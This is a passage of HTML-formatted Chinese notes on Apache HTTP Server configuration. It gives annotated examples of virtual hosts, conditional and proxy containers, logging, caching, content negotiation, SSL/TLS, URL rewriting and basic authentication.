172.20.30.50&gt;    DocumentRoot "/www/example4"    ServerName www.example.edu&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.60&gt;    DocumentRoot "/www/example5"    ServerName www.example.gov&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="一起使用-Virtual-host-和-mod-proxy"><a href="#一起使用-Virtual-host-和-mod-proxy" class="headerlink" title="一起使用 Virtual_host 和 mod_proxy"></a>一起使用 Virtual_host 和 mod_proxy</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost *:*&gt;    ProxyPreserveHost On    ProxyPass        "/" "http://192.168.111.2/"    ProxyPassReverse "/" "http://192.168.111.2/"    ServerName hostname.example.com&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用-default-vhosts"><a href="#使用-default-vhosts" class="headerlink" title="使用_default_vhosts"></a>使用<code>_default_</code>vhosts</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost _default_:80&gt;    DocumentRoot "/www/default80"    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost _default_:*&gt;    DocumentRoot "/www/default"    # ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="将基于名称的虚拟主机迁移到基于-IP-的虚拟主机"><a href="#将基于名称的虚拟主机迁移到基于-IP-的虚拟主机" class="headerlink" title="将基于名称的虚拟主机迁移到基于 IP 的虚拟主机"></a>将基于名称的虚拟主机迁移到基于 IP 的虚拟主机</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80ServerName www.example.comDocumentRoot "/www/example1"&amp;ltVirtualHost 172.20.30.40 172.20.30.50&gt;    DocumentRoot "/www/example2"    ServerName www.example.org    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example3"    ServerName www.example.net    ServerAlias *.example.net    # ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用-ServerPath-指令"><a href="#使用-ServerPath-指令" class="headerlink" title="使用 ServerPath 指令"></a>使用 ServerPath 指令</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost 172.20.30.40&gt;    # primary vhost    DocumentRoot "/www/subdomain"    RewriteEngine On    RewriteRule "." "/www/subdomain/index.html"    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/subdomain/sub1"    ServerName www.sub1.domain.tld    ServerPath "/sub1/"    RewriteEngine On    RewriteRule "^(/sub1/.*)" "/www/subdomain$1"    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/subdomain/sub2"    ServerName www.sub2.domain.tld    ServerPath "/sub2/"    RewriteEngine On    RewriteRule "^(/sub2/.*)" "/www/subdomain$1"    # ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="条件判断容器"><a href="#条件判断容器" class="headerlink" title="条件判断容器"></a>条件判断容器</h3><h4 id="If"><a href="#If" class="headerlink" title="If"></a>If</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIf "!(%{HTTP_REFERER} -strmatch 'http://www.example.com/*')"&gt;    Require all denied&amp;lt/If&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>If</code></td><td>条件满足则执行内部语句</td></tr><tr><td><code>!(%{HTTP_REFERER} -strmatch 'http://www.example.com/*')</code></td><td>条件</td></tr><tr><td>…</td><td></td></tr></tbody></table><h4 id="IfDefine"><a href="#IfDefine" class="headerlink" title="IfDefine"></a>IfDefine</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIfDefine ClosedForNow&gt;    Redirect / http://otherserver.example.com/&amp;lt/IfDefine&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>IfDefine</code></td><td>若使用<code>httpd -D ClosedForNow</code>指令执行的操作就会执行里面的内容（可镶嵌）</td></tr><tr><td><code>ClosedForNow</code></td><td>使用<code>httpd -D ClosedForNow</code>指令执行，前面加！表示相反</td></tr><tr><td><code>Redirect</code></td><td>跳转到另一站点</td></tr><tr><td>…</td><td></td></tr></tbody></table><h4 id="IfModule"><a href="#IfModule" class="headerlink" title="IfModule"></a>IfModule</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIfModule mod_mime_magic.c&gt;    MimeMagicFile conf/magic&amp;lt/IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>IfModule</code></td><td>若使用了<code>mod_mime_magic</code>模块就执行里面内容（可镶嵌）</td></tr><tr><td><code>mod_mime_magic.c</code></td><td>模块名</td></tr><tr><td><code>MimeMagicFile</code></td><td>执行的指令</td></tr><tr><td>…</td><td></td></tr></tbody></table><h4 id="IfVersion"><a href="#IfVersion" class="headerlink" title="IfVersion"></a>IfVersion</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIfVersion &gt;= 2.1&gt;    # this happens only in versions greater or    # equal 2.1.0.&amp;lt/IfVersion&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>IfVersion</code></td><td>版本满足就会执行</td></tr><tr><td>….</td><td></td></tr></tbody></table><h3 id="网站空间容器"><a href="#网站空间容器" class="headerlink" title="网站空间容器"></a>网站空间容器</h3><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltLocation "/status"&gt;  SetHandler server-status  Require host example.com&amp;lt/Location&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>Location</code></td><td>Location 容器内定义的指令仅对特定的 URL 有效</td></tr><tr><td><code>/status</code></td><td>将特定URL映射到<code>mod_status</code>提供的内部<code>Apache HTTP Server</code>处理程序</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="Proxy容器"><a href="#Proxy容器" class="headerlink" title="Proxy容器"></a>Proxy容器</h3><h4 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy "http://example.com/foo/*"&gt;  SetOutputFilter INCLUDES&amp;lt/Proxy&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="更灵活的匹配容器"><a href="#更灵活的匹配容器" class="headerlink" title="更灵活的匹配容器"></a>更灵活的匹配容器</h3><h4 id="DirectoryMatch"><a href="#DirectoryMatch" class="headerlink" title="DirectoryMatch"></a>DirectoryMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectoryMatch "^/www/(.+/)?[0-9]{3}/"&gt;    # ...&amp;lt/DirectoryMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="FilesMatch"><a href="#FilesMatch" class="headerlink" title="FilesMatch"></a>FilesMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltFilesMatch ".+\.(gif|jpe?g|png)$"&gt;    # ...&amp;lt/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="LocationMatch"><a href="#LocationMatch" class="headerlink" title="LocationMatch"></a>LocationMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltLocationMatch "^/combined/(?&amp;ltsitename&gt;[^/]+)"&gt;    Require ldap-group cn=%{env:MATCH_SITENAME},ou=combined,o=Example&amp;lt/LocationMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ProxyMatch"><a href="#ProxyMatch" class="headerlink" title="ProxyMatch"></a>ProxyMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxyMatch "^http://(?&amp;ltsitename&gt;[^/]+)"&gt;    Require ldap-group cn=%{env:MATCH_SITENAME},ou=combined,o=Example&amp;lt/ProxyMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h3><h4 id="通用日志格式"><a href="#通用日志格式" class="headerlink" title="通用日志格式"></a>通用日志格式</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">LogFormat "%h %l %u %t \"%r\" %&gt;s %b" commonCustomLog logs/access_log.log common<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="组合日志格式"><a href="#组合日志格式" class="headerlink" title="组合日志格式"></a>组合日志格式</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-agent}i\"" combinedCustomLog log/access_log.log combined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>%h</code>是远程主机</li><li><code>%l</code>是由identd确定的用户的身份</li><li><code>%u</code>是HTTP身份验证确定的用户名</li><li><code>%t</code>是服务器处理完请求的时间</li><li><code>%r</code>是来自客户端的请求行GET、HTTP</li><li><code>%&gt; s</code>是从服务器发送到客户端的状态代码</li><li><code>%b</code>是客户端响应的大小(以字节为单位)</li><li><code>"%{Referer}i</code>是链接到此URL的页面</li><li><code>%{User-Agent}i</code> 是客户浏览器提供的浏览器识别信息</li></ul><pre class="line-numbers language-config" data-language="config"><code class="language-config">LogFormat "%400,501{User-agent}i" browserlogLogFormat "%!200,304,302{Referer}i" refererlog#前面的状态码是用来判断的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>ErrorLog</code> “xxx”</td><td>定位服务器错误日志的位置，默认使用相对路径</td></tr><tr><td><code>LogLevel warn</code></td><td>日志级别</td></tr><tr><td><code>ErrorLogFormat</code></td><td>设置错误日志的格式</td></tr><tr><td><code>CustomLog logs/access_log common</code></td><td>创建和格式化日志文件<code>common</code></td></tr><tr><td><code>LogFormat "%h %l %u %t "%r" %&gt;s %b "%{Referer}i" "%{User-agent}i"" common</code></td><td><code>common</code>为用户日志别名，中间为具体格式</td></tr><tr><td><code>TransferLog "logs/host.example.com-access_log"</code></td><td>创建日志文件</td></tr><tr><td>…</td><td></td></tr></tbody></table><h2 id="附加的配置文件"><a href="#附加的配置文件" class="headerlink" title="附加的配置文件"></a>附加的配置文件</h2><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><h4 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h4><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>unique_id_module</code></td><td>为每个请求提供一个具有唯一标识符的环境变量</td></tr><tr><td><code>PassEnv LD_LIBRARY_PATH</code></td><td>从 shell 传递环境变量</td></tr><tr><td><code>SetEnv SPECIAL_PATH /foo/bin</code></td><td>设置环境变量</td></tr><tr><td><code>UnsetEnv LD_LIBRARY_PATH</code></td><td>从环境中删除变量</td></tr><tr><td><code>SetEnvIf Request_URI "\.(.*)$" EXTENSION=$1</code></td><td>根据请求的属性设置环境变量</td></tr><tr><td><code>SetEnvIfExpr expr [!]env-variable[=value] [[!]env-variable[=value]] ...</code></td><td></td></tr><tr><td><code>BrowserMatch Robot is_a_robot </code>&amp;ltbr&gt;<code>SetEnvIf User-Agent Robot is_a_robot</code></td><td>以 HTTP 用户代理为条件设置环境变量</td></tr><tr><td><code>SetEnvIfNoCase</code></td><td>根据请求的属性设置环境变量而不考虑大小写</td></tr><tr><td>…</td><td></td></tr></tbody></table><h4 id="使用环境变量"><a href="#使用环境变量" class="headerlink" title="使用环境变量"></a>使用环境变量</h4><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>Require all granted</code></td><td></td></tr><tr><td><code>CustomLog</code></td><td>设置日志文件的文件名和格式</td></tr><tr><td><code>Allow</code></td><td>控制哪些主机可以访问服务器的某个区域</td></tr><tr><td><code>Deny</code></td><td>控制哪些主机被拒绝访问服务器</td></tr><tr><td><code>ExtFilterDefine</code></td><td>定义外部过滤器</td></tr><tr><td>`Header [condition] add</td><td>append</td></tr><tr><td><code>Header set Content-Type "text/plain" "expr=-z %{CONTENT_TYPE}"</code></td><td></td></tr><tr><td><code>RewriteCond TestString CondPattern [flags]</code></td><td>定义重写发生的条件</td></tr><tr><td><code>RewriteRule Pattern Substitution [flags]</code></td><td>定义重写引擎的规则</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="缓存指南"><a href="#缓存指南" class="headerlink" title="缓存指南"></a>缓存指南</h3><pre class="line-numbers language-config" data-language="config"><code class="language-config">Sample httpd.conf## Sample Cache Configuration#LoadModule cache_module modules/mod_cache.so&amp;ltIfModule mod_cache.c&gt;    LoadModule cache_disk_module modules/mod_cache_disk.so    &amp;ltIfModule mod_cache_disk.c&gt;        CacheRoot "c:/cacheroot"        CacheEnable disk  "/"        CacheDirLevels 5        CacheDirLength 3    &amp;lt/IfModule&gt;    # When acting as a proxy, don't cache the list of security updates    CacheDisable "http://security.update.server/update-list/"&amp;lt/IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>CacheRoot</code></td><td>存放缓存文件的根目录</td></tr><tr><td><code>CacheDirLength</code></td><td>子目录名称中的字符数</td></tr><tr><td><code>CacheDirLevels</code></td><td>缓存中子目录的级别数</td></tr><tr><td><code>CacheMaxFileSize</code></td><td>要放置在缓存中的文档的最大大小（以字节为单位）</td></tr><tr><td><code>CacheReadSize</code></td><td>在向下游发送数据之前要读取和缓存的文档的最小大小（以字节为单位）</td></tr><tr><td><code>CacheReadTime</code></td><td>在向下游发送数据之前读取时应经过的最短时间（以毫秒为单位）</td></tr><tr><td><code>CacheEnable cache_type [url-string]</code></td><td>使用指定的存储管理器启用指定 URL 的缓存</td></tr><tr><td><code>CacheSocache type[:args]</code></td><td>要使用的共享对象缓存实现</td></tr><tr><td><code>CacheDisable</code></td><td>禁用指定 URL 的缓存</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h3><h4 id="使用类型映射文件"><a href="#使用类型映射文件" class="headerlink" title="使用类型映射文件"></a>使用类型映射文件</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">AddHandler type-map .var<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>类型映射文件应与其描述的资源具有相同的名称，后跟扩展名<code>.var</code>.在下面显示的示例中，资源名为<code>foo</code>，因此类型映射文件名为<code>foo.var</code></p><pre class="line-numbers language-config" data-language="config"><code class="language-config">URI: fooURI: foo.en.htmlContent-type: text/htmlContent-language: enURI: foo.fr.de.htmlContent-type: text/html;charset=iso-8859-2Content-language: fr, de<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-config" data-language="config"><code class="language-config">URI: fooURI: foo.jpegContent-type: image/jpeg; qs=0.8URI: foo.gifContent-type: image/gif; qs=0.5URI: foo.txtContent-type: text/plain; qs=0.01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-config" data-language="config"><code class="language-config">URI: document.htmlContent-language: enContent-type: text/htmlURI: document.html.enContent-language: frContent-type: text/htmlURI: document.html.frContent-language: deContent-type: text/htmlURI: document.html.de<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这三段代码都是<code>type-map</code></p><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>URI: document.html</code></td><td>资源名</td></tr><tr><td><code>Content-type</code></td><td>资源类型</td></tr><tr><td><code>Content-language</code></td><td>资源语言</td></tr><tr><td><code>qs</code></td><td>权重</td></tr><tr><td><code>AddHandler type-map .var</code></td><td>与名为<code>type-map</code>的处理程序关联</td></tr><tr><td><code>.var</code></td><td>相当<code>*</code>的匹配值</td></tr><tr><td>…</td><td></td></tr></tbody></table><h4 id="Multiviews"><a href="#Multiviews" class="headerlink" title="Multiviews"></a>Multiviews</h4><p>如果服务器收到<code>/some/dir/foo</code>的请求，如果<code>/some/dir</code>启用了MultiViews，并且<code>/some/dir/foo</code>不存在，那么服务器会读取寻找的目录名为<code>foo.*</code>的文件</p><h3 id="从-URL-映射到文件系统"><a href="#从-URL-映射到文件系统" class="headerlink" title="从 URL 映射到文件系统"></a>从 URL 映射到文件系统</h3><p>Apache HTTP Server 使用请求的 URL 来确定提供文件的文件系统位置</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">ProxyPass         "/mirror/foo/" "http://backend.example.com/"ProxyPassReverse  "/mirror/foo/" "http://backend.example.com/"ProxyPassReverseCookieDomain  "backend.example.com"  "public.example.com"ProxyPassReverseCookiePath  "/"  "/mirror/foo/"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td>`Alias [URL-path] file-path</td><td>directory-path`</td></tr><tr><td><code>Alias "/docs" "/var/web"</code></td><td>网址 <code>http://www.example.com/docs/dir/file.html</code> 将从<code>/var/web/dir/file.html</code>提供</td></tr><tr><td>`AliasMatch regex file-path</td><td>directory-path`</td></tr><tr><td><code>AliasMatch "^/icons(/$)(.*)" "/usr/local/apache/icons$1$2"</code></td><td></td></tr><tr><td>`CheckSpelling on</td><td>off`</td></tr><tr><td><code>DirectoryIndex disabled local-url [local-url] ...</code></td><td>客户端请求目录时要查找的资源列表</td></tr><tr><td><code>DocumentRoot </code></td><td></td></tr><tr><td><code>ErrorDocument 404 /errors/bad_urls.php</code></td><td>发生错误时服务器将返回给客户端的内容</td></tr><tr><td><code>Options</code></td><td></td></tr><tr><td><code>ProxyPass "/mirror/foo/" "http://backend.example.com/"</code></td><td>将远程服务器映射到本地服务器 URL 空间</td></tr><tr><td><code>ProxyPassReverse [path] url [interpolate]</code></td><td>调整从反向代理服务器发送的 HTTP 响应标头中的 URL</td></tr><tr><td><code>ProxyPassReverseCookieDomain internal-domain public-domain [interpolate]</code></td><td>从反向代理服务器调整 Set-Cookie 标头中的域字符串</td></tr><tr><td><code>ProxyPassReverseCookiePath internal-path public-path [interpolate]</code></td><td>调整来自反向代理服务器的 Set-Cookie 标头中的 Path 字符串</td></tr><tr><td><code>Redirect [status] [URL-path] URL</code></td><td>发送外部重定向请求客户端获取不同的 URL</td></tr><tr><td><code>Redirect 303 "/three" "http://example.com/other"</code></td><td></td></tr><tr><td><code>RedirectMatch [status] regex URL</code></td><td>根据当前 URL 的正则表达式匹配发送外部重定向</td></tr><tr><td><code>RewriteCond TestString CondPattern [flags]</code></td><td>定义重写发生的条件</td></tr><tr><td><code>RewriteRule Pattern Substitution [flags]</code></td><td>定义重写引擎的规则</td></tr><tr><td>`ScriptAlias [URL-path] file-path</td><td>directory-path`</td></tr><tr><td>`ScriptAliasMatch regex file-path</td><td>directory-path`</td></tr><tr><td><code>UserDir directory-filename [directory-filename] ...</code></td><td>用户特定目录的位置</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h3><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td>`ServerName [scheme://]domain-name</td><td>ip-address[:port]`</td></tr><tr><td>`ServerAdmin email-address</td><td>URL`</td></tr><tr><td>`ServerSignature On</td><td>Off</td></tr><tr><td>`ServerTokens Major</td><td>Minor</td></tr><tr><td>`UseCanonicalName On</td><td>Off</td></tr><tr><td>`UseCanonicalPhysicalPort On</td><td>Off`</td></tr><tr><td><code>CoreDumpDirectory directory</code></td><td>Apache HTTP Server 在转储核心之前尝试切换的目录</td></tr><tr><td><code>DocumentRoot directory-path</code></td><td>构成 Web 上可见的主文档树的目录</td></tr><tr><td>`ErrorLog file-path</td><td>syslog[:[facility]`</td></tr><tr><td>`Mutex mechanism [default</td><td>mutex-name] … [OmitPID]`</td></tr><tr><td><code>PidFile filename</code></td><td>服务器记录守护进程进程ID的文件</td></tr><tr><td><code>ScoreBoardFile file-path</code></td><td>用于存储子进程的协调数据的文件的位置</td></tr><tr><td><code>ServerRoot directory-path</code></td><td>服务器安装的基本目录</td></tr><tr><td><code>LimitRequestBody bytes</code></td><td>限制客户端发送的 HTTP 请求正文的总大小</td></tr><tr><td><code>LimitRequestFields number</code></td><td>限制将从客户端接受的 HTTP 请求头字段的数量</td></tr><tr><td><code>LimitRequestFieldSize bytes</code></td><td>限制客户端允许的 HTTP 请求头的大小</td></tr><tr><td><code>LimitRequestLine bytes</code></td><td>限制将从客户端接受的 HTTP 请求行的大小</td></tr><tr><td>`RLimitCPU seconds</td><td>max [seconds</td></tr><tr><td>`RLimitMEM bytes</td><td>max [bytes</td></tr><tr><td>`RLimitNPROC number</td><td>max [number</td></tr><tr><td><code>ThreadStackSize size</code></td><td>处理客户端连接的线程使用的堆栈大小（以字节为单位）</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="SSL-TLS-加密"><a href="#SSL-TLS-加密" class="headerlink" title="SSL/TLS 加密"></a>SSL/TLS 加密</h3><p>an example</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">LoadModule ssl_module modules/mod_ssl.soListen 443&amp;ltVirtualHost *:443&gt;    ServerName www.example.com    SSLEngine on    SSLCertificateFile "/path/to/www.example.com.cert"    SSLCertificateKeyFile "/path/to/www.example.com.key"&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性值</th><th>意义</th></tr></thead><tbody><tr><td><code>SSLEngine on</code></td><td>SSL 引擎操作开关</td></tr><tr><td>`SSLCertificateFile file-path</td><td>certid`</td></tr><tr><td>`SSLCertificateKeyFile file-path</td><td>keyid`</td></tr><tr><td><code>SSLCipherSuite [protocol] cipher-spec</code></td><td>密码套件可用于 SSL 握手中的协商</td></tr><tr><td><code>SSLCipherSuite RC4-SHA:AES128-SHA:HIGH:!aNULL:!MD5</code></td><td></td></tr><tr><td>`SSLHonorCipherOrder on</td><td>off`</td></tr><tr><td><code>SSLUseStapling off</code></td><td>在 TLS 握手中启用 OCSP 响应的装订</td></tr><tr><td><code>SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"</code></td><td>配置 OCSP 装订缓存</td></tr><tr><td><code>SSLVerifyClient level</code></td><td>客户端证书验证类型</td></tr><tr><td><code>SSLVerifyDepth number</code></td><td>客户端证书验证中 CA 证书的最大深度</td></tr><tr><td><code>SSLCACertificateFile file-path</code></td><td>用于客户端身份验证的串联 PEM 编码 CA 证书文件</td></tr><tr><td>`SSLOptions [+</td><td>-]option …`</td></tr><tr><td><code>SSLRequire expression</code></td><td>仅当任意复杂的布尔表达式为真时才允许访问</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="URL重写"><a href="#URL重写" class="headerlink" title="URL重写"></a>URL重写</h3><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>RewriteBase URL-path</code></td><td>设置每个目录重写的基本 URL</td></tr><tr><td><code>RewriteCond TestString CondPattern [flags]</code></td><td>定义重写发生的条件</td></tr><tr><td><code>RewriteRule Pattern Substitution [flags]</code></td><td>定义重写引擎的规则</td></tr><tr><td>RewriteEngine on|off</td><td>启用或禁用运行时重写引擎</td></tr><tr><td>RewriteMap <em>MapName</em> <em>MapType</em>:MapSource [MapTypeOptions]</td><td>定义键查找的映射函数</td></tr><tr><td>RewriteOptions Options</td><td>为重写引擎设置一些特殊选项</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="认证和授权"><a href="#认证和授权" class="headerlink" title="认证和授权"></a>认证和授权</h3><table><thead><tr><th>属性值</th><th>意义</th></tr></thead><tbody><tr><td><code>AllowOverride AuthConfig</code></td><td>.htaccess 文件中允许的指令类型</td></tr><tr><td>`AuthType None</td><td>Basic</td></tr><tr><td><code>AuthBasicProvider provider-name [provider-name] ...</code></td><td>设置此位置的身份验证提供程序</td></tr><tr><td><code>AuthDigestProvider provider-name [provider-name] ...</code></td><td>设置此位置的身份验证提供程序</td></tr><tr><td><code>Require [not] entity-name [entity-name] ...</code></td><td>测试经过身份验证的用户是否由授权提供者授权</td></tr><tr><td><code>AuthName auth-domain</code></td><td>用于 HTTP 身份验证的授权领域</td></tr><tr><td><code>AuthUserFile file-path</code></td><td>设置包含用于身份验证的用户和密码列表的文本文件的名称</td></tr><tr><td><code>AuthDBMUserFile file-path</code></td><td>设置包含用于身份验证的用户和密码列表的数据库文件的名称</td></tr><tr><td><code>AuthGroupFile file-path</code></td><td>设置包含授权用户组列表的文本文件的名称</td></tr><tr><td>`AuthLDAPURL url [NONE</td><td>SSL</td></tr><tr><td><code>AuthGroupFile file-path</code></td><td>设置包含授权用户组列表的文本文件的名称</td></tr><tr><td><code>Require valid-user</code></td><td>所有有效用户都可以访问该资源</td></tr><tr><td><code>Require user userid [userid] ...</code></td><td>只有指定用户才能访问资源</td></tr><tr><td><code>Require group group-name [group-name] ...</code></td><td>只有命名组中的用户才能访问资源</td></tr><tr><td><code>&amp;ltRequireAll&gt; ... &amp;lt/RequireAll&gt;</code></td><td>附上一组授权指令，其中没有一个必须失败，并且至少一个必须成功才能使封闭指令成功</td></tr><tr><td><code>&amp;ltRequireAny&gt; ... &amp;lt/RequireAny&gt;</code></td><td>附上一组授权指令，其中一个必须成功才能使封闭指令成功</td></tr><tr><td><code>&amp;ltRequireNone&gt; ... &amp;lt/RequireNone&gt;</code></td><td>包含一组授权指令，其中没有一个必须成功才能使封闭指令不失败</td></tr><tr><td>…</td><td></td></tr></tbody></table><h4 id="如何工作"><a href="#如何工作" class="headerlink" title="如何工作"></a>如何工作</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">htpasswd <span class="token parameter variable">-c</span> /usr/local/apache/passwd/passwords rbowen<span class="token comment">#创建文件</span>GroupName: rbowen dpitts sungo rshersey<span class="token comment">#创建一个将组名与该组中的用户列表关联的组文件</span>htpasswd /usr/local/apache/passwd/passwords dpitts<span class="token comment">#将用户添加到您已存在的密码文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h4><p>能放在<code>.htaccess</code>中或者<code>Directory</code>中</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">AuthType BasicAuthName "Restricted Files"# (Following line optional)AuthBasicProvider fileAuthUserFile "/usr/local/apache/passwd/passwords"Require user rbowen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="让不止一个人进来"><a href="#让不止一个人进来" class="headerlink" title="让不止一个人进来"></a>让不止一个人进来</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">AuthType BasicAuthName "By Invitation Only"# Optional line:AuthBasicProvider fileAuthUserFile "/usr/local/apache/passwd/passwords"AuthGroupFile "/usr/local/apache/passwd/groups"Require group GroupName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="备用密码存储"><a href="#备用密码存储" class="headerlink" title="备用密码存储"></a>备用密码存储</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/www/docs/private"&gt;    AuthName "Private"    AuthType Basic    AuthBasicProvider dbm    AuthDBMUserFile "/www/passwords/passwd.dbm"    Require valid-user&amp;lt/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用多个提供商"><a href="#使用多个提供商" class="headerlink" title="使用多个提供商"></a>使用多个提供商</h4><p>使用文件组授权和 LDAP 组授权</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/www/docs/private"&gt;    AuthName "Private"    AuthType Basic    